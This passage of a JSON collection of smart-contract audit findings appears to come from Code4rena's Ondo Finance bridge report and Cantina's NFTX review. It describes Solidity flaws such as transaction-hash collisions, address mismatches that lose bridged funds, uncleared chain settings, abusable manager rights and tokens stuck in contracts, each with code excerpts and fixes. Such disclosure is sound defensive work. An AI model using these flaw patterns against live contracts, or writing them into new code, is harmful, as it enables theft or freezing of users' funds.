      "title": "[M-03] Two different transactions can result in the same `txnHash` value, thus breaking the approval process of transaction minting",
      "impact": "MEDIUM",
      "content": "\nThe `DestinationBridge._execute` is an internal function that is executed when contract is called by Axelar Gateway. The `_execute` function stores the `Transaction` struct in the `txnHashToTransaction` mapping as shown below:\n\n    bytes32 txnHash = keccak256(payload);\n    txnHashToTransaction[txnHash] = Transaction(srcSender, amt); \n\nThe transaction hash `txnHash` is calculated by `keccak256(payload)` and the `payload` is an `abi encoded` value consisting of following variables.\n\n    bytes32 version, address srcSender, uint256 amt, uint256 nonce\n\nThe issue here is that the two different `srcChains` with two different `srcAddr` contracts can end up providing the same `txnHash` if the above mentioned `version`, `srcSender`, `amt` and `nonce` are the same. The `_execute` function only restricts the same `srcAddr` to not to use the same `nonce` as shown below:\n\n    if (isSpentNonce[chainToApprovedSender[srcChain]][nonce]) {\n      revert NonceSpent();\n    }\n\nBut the problem is if there are different `srcAddr`s providing the same `payload` it will result into the same `txnHash`.\n\nHence, there could be two transactions with the same transaction hash (`txnHash`). The later transaction will override the `txnToThresholdSet[txnHash]` of the former transaction. As a result, the approval process for transaction minting will be broken.\n\n### Proof of Concept\n\n```solidity\n    bytes32 txnHash = keccak256(payload);\n    txnHashToTransaction[txnHash] = Transaction(srcSender, amt);\n```\n\n<https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L108-L109>\n\n```solidity\n        txnToThresholdSet[txnHash] = TxnThreshold(\n          t.numberOfApprovalsNeeded,\n          new address[](0)\n        );\n```\n\n<https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L137-L140>\n\n```solidity\n    (bytes32 version, address srcSender, uint256 amt, uint256 nonce) = abi\n      .decode(payload, (bytes32, address, uint256, uint256));\n```\n\n<https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L90-L91>\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIt is recommended to include the `srcChain` and the `srcAddr` in the payload as well, which is getting hashed to calculate the `txnHash`. By doing so, different transactions coming from different `srcChains` and `srcAddr` will not result into the same `txnHash`. The approval process for the transaction minting via the bridge will successfully execute.\n\n**[kirk-baird (judge) decreased severity to Medium](https://github.com/code-423n4/2023-09-ondo-findings/issues/391#issuecomment-1734755117)**\n\n**[ali2251 (Ondo) confirmed](https://github.com/code-423n4/2023-09-ondo-findings/issues/391#issuecomment-1738094872)**\n\n***\n\n",
      "summary": "\nA bug has been identified in the DestinationBridge._execute function of the Axelar Gateway contract. This function stores the Transaction struct in the txnHashToTransaction mapping, using the payload to calculate the txnHash. The payload is an abi encoded value consisting of version, source sender, amount and nonce. The issue is that two different source chains with two different source addresses can end up providing the same txnHash if the variables mentioned above are the same. This means that the later transaction will override the txnToThresholdSet[txnHash] of the former transaction, resulting in the approval process for transaction minting being broken.\n\nA proof of concept has been provided, using VSCode, and the recommended mitigation step is to include the source chain and source address in the payload, which is used to calculate the txnHash. This ensures that different transactions from different source chains and source addresses will not result in the same txnHash, and the approval process for the transaction minting via the bridge will successfully execute.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "https://github.com/code-423n4/2023-09-ondo-findings/issues/391",
      "tags": [],
      "finders": [
        "0xDING99YA",
        "seerether",
        "kutugu",
        "bin2chen",
        "pep7siup",
        "1",
        "Udsen",
        "SpicyMeatball",
        "2",
        "bowtiedvirus",
        "adriro",
        "Inspecktor",
        "ast3ros"
      ]
    },
    {
      "id": "27014",
      "title": "[M-02] All bridged funds will be lost for the users using the account abstraction wallet",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-09-ondo/blob/47d34d6d4a5303af5f46e907ac2292e6a7745f6c/contracts/bridge/SourceBridge.sol#L61-L82><br>\n<https://github.com/code-423n4/2023-09-ondo/blob/47d34d6d4a5303af5f46e907ac2292e6a7745f6c/contracts/bridge/DestinationBridge.sol#L85-L114>\n\n### Impact\n\nUsers with account abstraction wallets have a different address across different chains for same account, so if someone using an account abstraction wallet bridge the asset, assets will be minted to wrong address and lost permanently.\n\n### Proof of Concept\n\nAccount abstraction wallets have been on the rise for quite a time now and have a lot of users. See the below image for the figures by safe wallet (one of the account abstraction wallets):\n\n![https://user-images.githubusercontent.com/135237830/273336415-ecc7eef9-1e00-49b4-b48b-5030d62a372b.png](https://user-images.githubusercontent.com/135237830/273336415-ecc7eef9-1e00-49b4-b48b-5030d62a372b.png)\n\nWith 4.4 million users and 5.4 billion assets, there is very high risk that safe wallet users will try to bridge the assets and loose them.\n\nNow, look at the codebase and understand how the assets will be lost.\n\nIn source bridge in `burnAndCallAxelar` we construct the payload as follow :\n\nHere, we can see the payload passes `msg.sender` as receiving an address on the other chain, assuming that the user has the same address across all the EVM chains; which is not the case if user is using the account abstraction wallet.\n\n```solidity\n    bytes memory payload = abi.encode(VERSION, msg.sender, amount, nonce++);\n```\n\nThen, it calls the following function passing the payload, which then calls the `callContract` function passing the payload to Axelar Network.\n\n```solidity\n  function _payGasAndCallCotract(\n    string calldata destinationChain,\n    string memory destContract,\n    bytes memory payload\n  ) private {\n    GAS_RECEIVER.payNativeGasForContractCall{value: msg.value}(\n      address(this),\n      destinationChain,\n      destContract,\n      payload,\n      msg.sender\n    );\n\n    // Send all information to AxelarGateway contract.\n    AXELAR_GATEWAY.callContract(destinationChain, destContract, payload);\n  }\n```\n\nThen, on the destination, any Axelar node can call the `execute()` function, passing in the payload. The tokens will be minted to an account abstraction wallet address of the source chain, but on destination, the same person will not be the owner of that address; hence, tokens are permanently lost.\n\n```solidity\n  function _execute(\n    string calldata srcChain,\n    string calldata srcAddr,\n    bytes calldata payload\n  ) internal override whenNotPaused {\n  \n    (bytes32 version, address srcSender, uint256 amt, uint256 nonce) = abi\n      .decode(payload, (bytes32, address, uint256, uint256));\n\n    if (version != VERSION) {\n      revert InvalidVersion();\n    }\n    if (chainToApprovedSender[srcChain] == bytes32(0)) {\n      revert ChainNotSupported();\n    }\n    // each chain have only one approved sender that is the source bridge contract.\n    if (chainToApprovedSender[srcChain] != keccak256(abi.encode(srcAddr))) {\n      revert SourceNotSupported();\n    }\n    if (isSpentNonce[chainToApprovedSender[srcChain]][nonce]) {\n      revert NonceSpent();\n    }\n\n    isSpentNonce[chainToApprovedSender[srcChain]][nonce] = true;\n\n    // same payload would have the same txhash\n    bytes32 txnHash = keccak256(payload);\n    txnHashToTransaction[txnHash] = Transaction(srcSender, amt);\n    _attachThreshold(amt, txnHash, srcChain);\n    _approve(txnHash);\n    _mintIfThresholdMet(txnHash);\n    emit MessageReceived(srcChain, srcSender, amt, nonce);\n  }\n```\n\n### Recommended Mitigation Steps\n\nGive the user the option to pass in the address the tokens should be minted to on the destination bridge. Pass in the warning for account abstraction wallet holders to not to pass the same wallet. Some wallets may follow a deterministic deployment approach to have same address, but as safe explains, that grants nothing, as each chain has its own different state and opcode differences; so even a deterministic approach may generate different addresses.\n\n### Assessed type\n\nInvalid Validation\n\n**[tom2o17 (Ondo) acknowledged, but disagreed with severity](https://github.com/code-423n4/2023-09-ondo-findings/issues/406#issuecomment-1717830062)**\n\n**[kirk-baird (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-09-ondo-findings/issues/406#issuecomment-1722402316):**\n > Downgrading this to medium severity as users would know ahead of time that the receiving address is the same as the sending address.\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the codebase of SourceBridge and DestinationBridge contracts, which are part of the Ondo project. The issue is that users with account abstraction wallets have a different address across different chains for the same account. This means that if someone using an account abstraction wallet bridges an asset, the asset will be minted to the wrong address and lost permanently.\n\nAccount abstraction wallets are becoming increasingly popular, with Safe Wallet having 4.4 million users and 5.4 billion assets. Therefore, it is likely that Safe Wallet users will try to bridge assets and lose them due to this bug.\n\nThe bug is caused by the `burnAndCallAxelar` function in the SourceBridge contract, which passes `msg.sender` as the receiving address on the other chain. This assumes that the user has the same address across all EVM chains, which is not the case if the user is using an account abstraction wallet.\n\nThe bug has been assessed as an \"Invalid Validation\" with a Medium severity, as users would know ahead of time that the receiving address is the same as the sending address.\n\nThe recommended mitigation steps include giving the user the option to pass in the address the tokens should be minted to on the destination bridge, and warning users with account abstraction wallets not to pass the same wallet. Additionally, some wallets may follow a deterministic deployment approach to have the same address, but this approach may still generate different addresses due to differences in each chain's state and opcode.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "https://github.com/code-423n4/2023-09-ondo-findings/issues/406",
      "tags": [],
      "finders": [
        "nirlin",
        "0xpiken",
        "pontifex",
        "ladboy233",
        "ast3ros"
      ]
    },
    {
      "id": "27013",
      "title": "[M-01] Chain support cannot be removed or cleared in bridge contracts",
      "impact": "MEDIUM",
      "content": "\nDue to how addresses are handled and stored in the configuration settings, it is not possible to remove chain support in both source and destination bridge contracts.\n\nThe Axelar bridge service uses strings to represent addresses: messages sent to another chain need to specify its destination contract as a string. The protocol decided to follow the same representation and contract store addresses as strings as part of their configuration.\n\nChain support in the bridge contracts is then represented by associating the chain name with the address of the contract, stored as a string. This can be seen in the implementation of `setDestinationChainContractAddress()` for the SourceBridge contract, which stores the string, and the implementation of `addChainSupport()` in the DestinationBridge contract, which stores the hash of the string:\n\n<https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/SourceBridge.sol#L121-L129>\n\n```solidity\n121:   function setDestinationChainContractAddress(\n122:     string memory destinationChain,\n123:     address contractAddress\n124:   ) external onlyOwner {\n125:     destChainToContractAddr[destinationChain] = AddressToString.toString(\n126:       contractAddress\n127:     );\n128:     emit DestinationChainContractAddressSet(destinationChain, contractAddress);\n129:   }\n```\n\n<https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L234-L240>\n\n```solidity\n234:   function addChainSupport(\n235:     string calldata srcChain,\n236:     string calldata srcContractAddress\n237:   ) external onlyOwner {\n238:     chainToApprovedSender[srcChain] = keccak256(abi.encode(srcContractAddress));\n239:     emit ChainIdSupported(srcChain, srcContractAddress);\n240:   }\n```\n\nThis also means that checks need to be done based on the stored representation. SourceBridge checks the length of the string, while DestinationBridge checks for a `bytes32(0)` value:\n\n<https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/SourceBridge.sol#L68-L71>\n\n```solidity\n68:     if (bytes(destContract).length == 0) {\n69:       revert DestinationNotSupported();\n70:     }\n71: \n```\n\n<https://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L96-L98>\n\n```solidity\n96:     if (chainToApprovedSender[srcChain] == bytes32(0)) {\n97:       revert ChainNotSupported();\n98:     }\n```\n\nNote that this implies that there is no way to clear these settings and remove chain support. In the case of SourceBridge, any address sent to `setDestinationChainContractAddress()` will be converted to their string representation, which will always have a length greater than zero. For the DestinationBridge, `addChainSupport()` will hash the address parameter and it will be impossible for that hash value to be zero (since it will imply knowing the preimage of zero).\n\n### Proof of Concept\n\n1. Admin configs the destination address in SourceBridge by calling `setDestinationChainContractAddress(\"optimism\", destinationAddress)`.\n2. Admin decides to remove support for Optimism.\n3. Admin calls `setDestinationChainContractAddress(\"optimism\", address(0))`, but this will actually store the string for the zero address `0x0000....000`.\n4. The check `bytes(destContract).length == 0` will fail and messages will still be routed.\n\n### Recommended Mitigation Steps\n\nProvide functions in both contracts to allow the owner to clear the settings by resetting their configuration to the default value.\n\n```solidity\nfunction removeDestinationChainContractAddress(\n  string memory destinationChain\n) external onlyOwner {\n  delete destChainToContractAddr[destinationChain];\n  emit DestinationChainContractAddressRemoved(destinationChain);\n}\n```\n\n```solidity\nfunction removeChainSupport(\n  string calldata srcChain\n) external onlyOwner {\n  delete chainToApprovedSender[srcChain];\n  emit ChainIdRemoved(srcChain);\n}\n```\n\n**[tom2o17 (Ondo) commented](https://github.com/code-423n4/2023-09-ondo-findings/issues/444#issuecomment-1739400196):**\n> @kirk-baird - Can I not set acceptable `srcAddr` to `address(0)` and then, given `address(0)` cannot have a contract deployed to it, this value should not be within the possible ranges of `srcAddr` within the `_execute` function?\n> \n> Granted not super ideal given it will hit a different error message, but functionally, the result is the same.\n\n**[kirk-baird (judge) commented](https://github.com/code-423n4/2023-09-ondo-findings/issues/444#issuecomment-1740049922):**\n> @tom2o17 - My concern here is that there's no way to stop calling `burnAndCallAxelar()`, which would burn tokens on the source chain. These would not be minted on the destination chain and are essentially lost.\n> \n> E.g. If you call `setDestinationChainContractAddress(dstChain, address(0))`, then [Address.toString(address(0))](https://github.com/code-423n4/2023-09-ondo/blob/47d34d6d4a5303af5f46e907ac2292e6a7745f6c/contracts/external/axelar/StringAddressUtils.sol#L34) will encode that to 42 hex characters.\n> \n> So [this check](https://github.com/code-423n4/2023-09-ondo/blob/47d34d6d4a5303af5f46e907ac2292e6a7745f6c/contracts/bridge/SourceBridge.sol#L68) in `burnAndCallAxelar()` will always pass, since `bytes(destContract).length` is 42 bytes.\n\n**[tom2o17 (Ondo) commented](https://github.com/code-423n4/2023-09-ondo-findings/issues/444#issuecomment-1741107906):**\n> @kirk-baird - Ah I see. I am inclined to accept this issue. Apologies, I thought this was referencing the `dstBridge` not the `srcBridge`. As mitigation we would be able to pause the contract, and prevent this functionality, but agree with the auditor that this is not ideal.\n\n**[tom2o17 (Ondo) acknowledged](https://github.com/code-423n4/2023-09-ondo-findings/issues/444#issuecomment-1757755137)**\n\n***\n\n",
      "summary": "\nThe Axelar bridge service is a protocol that uses strings to represent addresses when sending messages to other chains. This means that when a chain is added to the bridge, the chain name is associated with the address of the contract and stored as a string. This issue arises when an admin tries to remove chain support from the bridge. The protocol stores the address of the contract as a string, which means that the check `bytes(destContract).length == 0` will always fail, and messages will still be routed. This issue can be mitigated by providing functions in both contracts to allow the owner to clear the settings by resetting their configuration to the default value. Ondo has acknowledged the issue and is looking into mitigation steps.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "https://github.com/code-423n4/2023-09-ondo-findings/issues/444",
      "tags": [],
      "finders": [
        "gkrastenov",
        "adriro",
        "lsaudit"
      ]
    },
    {
      "id": "54564",
      "title": "CreateVaultZap.createVault sets the caller to manager may compromise later users. ",
      "impact": "LOW",
      "content": "## CreateVaultZap Documentation\n\n## Context\n`CreateVaultZap.sol#L238-L252`\n\n## Description\nThe `CreateVaultZap.createVault` function is responsible for creating the Vault and calls `setVaultFeatures` and `setFees` to initialize the settings. At the end of the function, it assigns the caller as the manager.\n\n```solidity\nif (params.vaultFeaturesFlag < 7) {\n    vault.setVaultFeatures(\n        _getBoolean(params.vaultFeaturesFlag, 2),\n        _getBoolean(params.vaultFeaturesFlag, 1),\n        _getBoolean(params.vaultFeaturesFlag, 0)\n    );\n}\nvault.setFees(\n    params.vaultFees.mintFee,\n    params.vaultFees.redeemFee,\n    params.vaultFees.swapFee\n);\nvault.setManager(msg.sender);\n```\n\nHowever, maintaining the caller's manager privileges might jeopardize the interests of future users. \n\n### Consider the following scenario:\n- Alice creates a Vault and deposits 10 NFTs.\n- Bob deposits 5 NFTs into the Vault. \n- Since Alice retains manager privileges, she can call `setFees` to impose a higher fee or call `setVaultFeatures` to prevent Bob from redeeming his NFTs after she redeems hers.\n\nAlthough `Factory.createVault` also encounters this issue, it's crucial to standardize the behavior of `CreateVaultZap.createVault` as it serves as the more universal entry point.\n\n## Recommendation\nOnce the initialization process is complete, it is advisable to call `finalizeVault` in order to revoke the manager privileges.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54563",
      "title": "Events coverage, conï¬guration checks, variable naming ",
      "impact": "LOW",
      "content": "## Code Review Recommendations\n\n## Context\n- **MarketplaceUniversalRouterZap.sol**: Lines 58-98, 433-449\n- **NFTXVaultUpgradeableV3.sol**: Lines 140-150\n- **NFTXRouter.sol**: Lines 423-424\n\n## Description\nEvents can be added and expanded/indexed/fixed, and names updated per recommendations below.\n\n## Recommendation\n\n1. **Consider adding the asset address or v3 vault id to the events:**\n   - **MarketplaceUniversalRouterZap.sol**: Lines 58-98\n     ```solidity\n     /// @param count The number of tokens affected by the event\n     /// @param ethReceived The amount of ETH received in the sell\n     /// @param to The user affected by the event\n     /// @param netRoyaltyAmount The royalty amount sent\n     /// @param wethFees Vault fees paid\n     event Sell(\n         uint256 count,\n         uint256 ethReceived,\n         address to,\n         uint256 netRoyaltyAmount,\n         uint256 wethFees\n     );\n     ```\n\n   - **Event Swap**: \n     ```solidity\n     /// @param ethSpent The amount of ETH spent in the swap\n     /// @param to The user affected by the event\n     event Swap(uint256[] idsIn, uint256[] idsOut, uint256 ethSpent, address to);\n     ```\n\n     Updated event:\n     ```solidity\n     event Swap(\n         uint256[] idsIn,\n         uint256[] amounts,\n         uint256[] idsOut,\n         uint256 ethSpent,\n         address to\n     );\n     ```\n\n   - **Event Buy**:\n     ```solidity\n     /// @param nftIds The nftIds bought\n     /// @param ethSpent The amount of ETH spent in the buy\n     /// @param to The user affected by the event\n     /// @param netRoyaltyAmount The royalty amount sent\n     event Buy(\n         uint256[] nftIds,\n         uint256 ethSpent,\n         address to,\n         uint256 netRoyaltyAmount\n     );\n     ```\n\n   - **Event DustReturned**:\n     ```solidity\n     /// @notice Emitted when dust is returned after a transaction.\n     /// @param ethAmount Amount of ETH returned to user\n     /// @param vTokenAmount Amount of vToken returned to user\n     /// @param to The user affected by the event\n     event DustReturned(uint256 ethAmount, uint256 vTokenAmount, address to);\n     ```\n\n   Also, the key parameters, e.g., asset and `to` addresses, can be indexed.\n\n2. **Consider emitting events in all three functions as they are material:**\n   - **MarketplaceUniversalRouterZap.sol**: Lines 433-449\n     ```solidity\n     /**\n      * @notice Allows our zap to be paused to prevent any processing.\n      *\n      * @param paused_ New pause state\n      */\n     function pause(bool paused_) external onlyOwner {\n         paused = paused_;\n     }\n\n     function setUniversalRouter(address universalRouter_) external onlyOwner {\n         universalRouter = universalRouter_;\n     }\n\n     function setDustThreshold(uint256 dustThreshold_) external onlyOwner {\n         dustThreshold = dustThreshold_;\n     }\n     ```\n\n   Also, a zero address check for `universalRouter_` and boundary checks for `dustThreshold_` are advised.\n\n3. **Consider renaming `emptyAmounts` for better clarity**:\n   - **NFTXVaultUpgradeableV3.sol**: Lines 140-150\n     ```solidity\n     function mint(\n         uint256[] calldata tokenIds,\n         uint256[] calldata amounts,\n         address depositor,\n         address to\n     ) external payable override nonReentrant returns (uint256 vTokensMinted) {\n         _onlyOwnerIfPaused(1);\n         if (!enableMint) revert MintingDisabled();\n         // Take the NFTs.\n         uint256 nftCount = _receiveNFTs(depositor, tokenIds, amounts);\n     }\n     ```\n\n4. **Introduce events for key actions in `MigratorZap` and `CreateVaultZap` (currently, there are none).**\n\n5. **Correct token count for ERC1155 in `NFTXRouter`:**\n   - **SellNFTs uses wrong token count**:\n     ```solidity\n     uint256 nftCount = !vToken.is1155()\n         ? params.nftIds.length\n         : _sum1155Ids(params.nftIds, params.nftAmounts);\n     ```\n\n     Current event:\n     ```solidity\n     event SellNFTs(uint256 nftCount, uint256 ethReceived);\n     ```\n   \n   Update emitting event:\n   ```solidity\n   emit SellNFTs(nftCount, wethRemaining);\n   ``` \n\n   ***Correction:***\n   Previously:\n   ```solidity\n   emit SellNFTs(params.nftIds.length, wethRemaining);\n   ``` \n   Corrected:\n   ```solidity\n   emit SellNFTs(nftCount, wethRemaining);\n   ```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54562",
      "title": "MigratorZap._v2ToV3Vault should limit the amount of VTokenV2 that is swapped ",
      "impact": "GAS",
      "content": "## MigratorZap.sol Overview\n\n## Context\n`MigratorZap.sol#L355-L375`\n\n## Description\nIn `MigratorZap._v2ToV3Vault`, unused VTokenV2s are swapped for ETH. Even if there is only 1 wei of VTokenV2, this may result in the user paying more in gas than the ETH swapped.\n\n```solidity\nvTokenV2Balance = vTokenV2Balance % 1 ether;\n// Sell fractional portion for WETH\nif (vTokenV2Balance > 0) {\n    address[] memory path = new address[](2);\n    path[0] = vTokenV2;\n    path[1] = address(WETH);\n    TransferLib.unSafeMaxApprove(\n        vTokenV2,\n        address(sushiRouter),\n        vTokenV2Balance\n    );\n    wethReceived = sushiRouter.swapExactTokensForTokens(\n        vTokenV2Balance,\n        minWethToReceive,\n        path,\n        address(this),\n        block.timestamp\n    )[path.length - 1];\n}\n```\n\n## Recommendation\nConsider limiting the swap with a value like `MINIMUM_INVENTORY_LIQUIDITY`, and when it is less than that, send it to the user instead of swapping it.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54561",
      "title": "MarketplaceUniversalRouterZap 's _sendETHResidue() doesn 't check for zero recipient, so residual ETH funds can be frozen ",
      "impact": "LOW",
      "content": "## MarketplaceUniversalRouterZap Vulnerability Analysis\n\n## Context\n- **File:** `MarketplaceUniversalRouterZap.sol`\n- **Line Number:** 702\n\n## Description\nWhen the `to` address is zero, the function `_sendETHResidue()` will permanently freeze the corresponding funds.\n\n```solidity\n// Code Reference \nMarketplaceUniversalRouterZap.sol#L700-L704\nfunction _sendETHResidue(address to) internal {\n    // sending entire ETH balance (hence accounting for the unused msg.value)\n    (bool success, ) = payable(to).call{value: address(this).balance}(\"\");\n    if (!success) revert UnableToSendETH();\n}\n```\n\nThe function `_sendETHResidue()` is invoked in all user-facing functions of `MarketplaceUniversalRouterZap` to handle the remainder of funds.\n\n## Impact\nThe current ETH balance of the contract will be burned if `to` is zero.\n\nGiven the very low likelihood but high impact, the severity is set to low.\n\n## Recommendation\nConsider implementing a check to prevent operational mistakes by disallowing the `to` address from being a zero address.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54560",
      "title": "MarketplaceUniversalRouterZap 's sell721() and sell1155() do not control the ongoing amount, failing with a low level error when there are not enouhg funds for fees and royalties ",
      "impact": "LOW",
      "content": "## Security Vulnerability Report\n\n## Context\n- `MarketplaceUniversalRouterZap.sol#L159-L166`\n- `MarketplaceUniversalRouterZap.sol#L353-L367`\n\n## Description\nBoth NFT selling functions of `MarketplaceUniversalRouterZap` execute fee and royalty deductions without amount checks and will fail with underflows when there is a lack of ongoing funds for any reason:\n\n### Function Call (Lines 159-166)\n```solidity\n_distributeVaultFees(vaultId, wethFees, true);\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    netRoyaltyAmount = _deductRoyalty(assetAddress, idsIn, wethAmount);\n}\nwethAmount -= (wethFees + netRoyaltyAmount); // if underflow, then revert desired\n```\n\n### Function Call (Lines 353-367)\n```solidity\n// Distributing vault fees with the weth received\nuint256 wethFees = _ethMintFees(INFTXVaultV3(vault), totalAmount);\n_distributeVaultFees(vaultId, wethFees, true);\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    netRoyaltyAmount = _deductRoyalty1155(\n        assetAddress,\n        idsIn,\n        amounts,\n        wethAmount\n    );\n}\nwethAmount -= (wethFees + netRoyaltyAmount); // if underflow, then revert desired\n```\n\n## Impact\nThe current logic can fail with a non-transparent low-level error, despite a clear business reason that can be communicated. This may interfere with integrations, making some programmatic usages of the protocol impossible. Given the medium likelihood and low impact, the severity is set to low.\n\n## Recommendation\nConsider introducing amount checks and the corresponding error handling before `_distributeVaultFees()` and `_deductRoyalty()`, so it is clear at what point the lack of funds state occurred.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54559",
      "title": "MarketplaceUniversalRouterZap 's swap1155() and _mint1155() allow for mistreating NFT type and freezing the tokens on the contract balance ",
      "impact": "MEDIUM",
      "content": "## Vulnerability Analysis: MarketplaceUniversalRouterZap.sol\n\n## Context\n- MarketplaceUniversalRouterZap.sol#L380-L410\n- MarketplaceUniversalRouterZap.sol#L521-L535\n\n## Description\nSimilarly to core protocol NFT type issue 70, there is a possibility for mistreating the type of the Vault, as both functions follow the ERC-1155 path, while the Vault can be ERC-721 and treat the supplied ids without reverting, but differently (e.g., with amounts fixed to be 1).\n\n### Code Snippet\n```solidity\nMarketplaceUniversalRouterZap.sol L380-L410\nfunction swap1155(\n...\n) external payable onlyOwnerIfPaused {\n    address vault = nftxVaultFactory.vault(vaultId);\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    >> IERC1155(assetAddress).safeBatchTransferFrom(\n        msg.sender,\n        address(this),\n        idsIn,\n        amounts,\n        \"\"\n    );\n    IERC1155(assetAddress).setApprovalForAll(vault, true);\n    // Swap our tokens. Forcing to deduct vault fees\n    >> uint256 ethFees = INFTXVaultV3(vault).swap{value: msg.value}(\n        idsIn,\n        amounts,\n        idsOut,\n        msg.sender,\n        to,\n        vTokenPremiumLimit,\n        true\n    );\n}\n```\n\nAs an example, Bob the user can supply to `MarketplaceUniversalRouterZap` ERC-1155 3 NFTs, while Vault, being of ERC-721 type, will fetch only 1 of them, with the remaining 2 stuck in the contract.\n\n## Impact\nUser operational mistakes when dealing with NFTs supporting both ERC-1155 and ERC-721 can lead to permanent freeze of these tokens on the `MarketplaceUniversalRouterZap` balance. Given the low likelihood and high impact, the severity is set to medium.\n\n## Recommendation\nConsider directly controlling for the Vault type in `swap1155()` and `_mint1155()`, for example:\n\n### Code Snippet\n```solidity\nMarketplaceUniversalRouterZap.sol L380-L410\nfunction swap1155(\n...\n) external payable onlyOwnerIfPaused {\n    address vault = nftxVaultFactory.vault(vaultId);\n    + if (!INFTXVaultV3(vault).is1155()) revert WrongVaultType();\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    IERC1155(assetAddress).safeBatchTransferFrom(\n        msg.sender,\n        address(this),\n        idsIn,\n        amounts,\n        \"\"\n    );\n    IERC1155(assetAddress).setApprovalForAll(vault, true);\n    // Swap our tokens. Forcing to deduct vault fees\n    uint256 ethFees = INFTXVaultV3(vault).swap{value: msg.value}(\n        idsIn,\n        amounts,\n        idsOut,\n        msg.sender,\n        to,\n        vTokenPremiumLimit,\n        true\n    );\n}\n```\n\n```solidity\nMarketplaceUniversalRouterZap.sol L521-L535\nfunction _mint1155(\n    uint256 vaultId,\n    uint256[] calldata ids,\n    uint256[] calldata amounts\n) internal returns (address vault, address assetAddress) {\n    vault = nftxVaultFactory.vault(vaultId);\n    + if (!INFTXVaultV3(vault).is1155()) revert WrongVaultType();\n    assetAddress = INFTXVaultV3(vault).assetAddress();\n    IERC1155(assetAddress).safeBatchTransferFrom(\n        msg.sender,\n        address(this),\n        ids,\n        amounts,\n        \"\"\n    );\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract called MarketplaceUniversalRouterZap.sol. The contract has two functions, swap1155 and _mint1155, that both use the ERC-1155 standard for handling tokens. However, the contract also allows for the use of a different standard, ERC-721, and this can cause problems. If a user makes a mistake when using the contract and sends both ERC-1155 and ERC-721 tokens, the ERC-721 tokens can get stuck in the contract and become unusable. This is a medium severity issue, and the recommendation is to add code to check for the token type and prevent this from happening.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54558",
      "title": "MigratorZap 's v2InventoryToXNFT() allows for NFT stealing as a result of operational mis- take ",
      "impact": "MEDIUM",
